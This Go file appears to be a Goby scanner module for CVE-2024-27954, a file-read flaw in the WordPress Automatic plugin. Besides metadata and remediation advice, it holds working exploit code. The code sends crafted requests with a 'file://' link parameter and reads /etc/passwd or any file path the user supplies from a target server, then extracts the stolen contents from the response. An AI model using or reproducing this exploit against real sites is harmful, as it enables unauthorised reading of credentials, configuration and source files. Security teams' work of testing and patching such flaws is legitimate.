package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Automatic Plugin / File Read Vulnerability (CVE-2024-27954)",
    "Description": "<p>WordPress is an open-source publishing platform developed using PHP language, allowing users to set up their own blogs and websites on servers that support PHP and MySQL databases. WordPress can also be used as a Content Management System (CMS).The WordPress Automatic Plugin has a file read vulnerability that attackers can exploit to obtain sensitive information.</p>",
    "Product": "WordPress",
    "Homepage": "http://www.wordpress.com/",
    "DisclosureDate": "2024-11-11",
    "PostTime": "2024-11-19",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/wp-content/plugins/wp-automatic\" && body=\"/plugins\"",
    "GobyQuery": "body=\"/wp-content/plugins/wp-automatic\" && body=\"/plugins\"",
    "Level": "2",
    "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.</p>",
    "Recommendation": "<p>1. Let web users only access (read) the files and paths they need  </p><p> 2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities </p><p> 3. Make it impossible for users to access paths other than the root directory of the web.  </p><p> 4. The manufacturer released the latest fixed version, pay attention to <a href=\"http://www.wordpress.com/\">http://www.wordpress.com/</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/WordPress/WordPress%20Automatic%20Plugin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2024-27954).md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-27954"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "WordPress Automatic Plugin / 文件读取漏洞（CVE-2024-27954）",
            "Product": "WordPress",
            "Description": "<p>WordPress是使用PHP语言开发的开源发布平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的博客、网站。也可以把WordPress当作一个内容管理系统（CMS）来使用。<br>其WordPress Automatic Plugin存在文件读取漏洞，攻击者可通过改漏洞获取敏感信息。</p>",
            "Recommendation": "<p>1、让web 用户只能访问（读取），所需要的文件和路径&nbsp;</p><p>2、不能有文件包含漏洞，目录遍历漏洞或其他漏洞&nbsp;</p><p>3、让用户不能访问Web 根目录以外的路径。&nbsp;</p><p>4、该厂商发布最新修复版本，关注<a href=\"http://www.wordpress.com/\">http://www.wordpress.com/</a><br></p>",
            "Impact": "<p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "WordPress Automatic Plugin / File Read Vulnerability (CVE-2024-27954)",
            "Product": "WordPress",
            "Description": "<p>WordPress is an open-source publishing platform developed using PHP language, allowing users to set up their own blogs and websites on servers that support PHP and MySQL databases. WordPress can also be used as a Content Management System (CMS).The WordPress Automatic Plugin has a file read vulnerability that attackers can exploit to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. Let web users only access (read) the files and paths they need&nbsp;&nbsp;</p><p>&nbsp;2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities&nbsp;</p><p>&nbsp;3. Make it impossible for users to access paths other than the root directory of the web.&nbsp;&nbsp;</p><p>&nbsp;4. The manufacturer released the latest fixed version, pay attention to <a href=\"http://www.wordpress.com/\">http://www.wordpress.com/</a><br></p>",
            "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9973"
}`

	postOrGet_m9jXTEDGmn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, "/?p=3232&wp_automatic=download&link=file://"+fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/?p=3232&wp_automatic=download&link=file://"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root:",
			}
			// 函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL + fileUrl
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root:"},
			}

			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			//匹配相关信息
			re := regexp.MustCompile(`"text":\["(.*?)"\]`)
			match := re.FindStringSubmatch(resp)
			var content string
			if len(match) > 1 {
				content = match[1]
				content = strings.ReplaceAll(content, "\\n", "")
				content = strings.ReplaceAll(content,"\\","")
			} else {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = "敏感信息泄露\n" + content
			return expResult
		},
	))
}
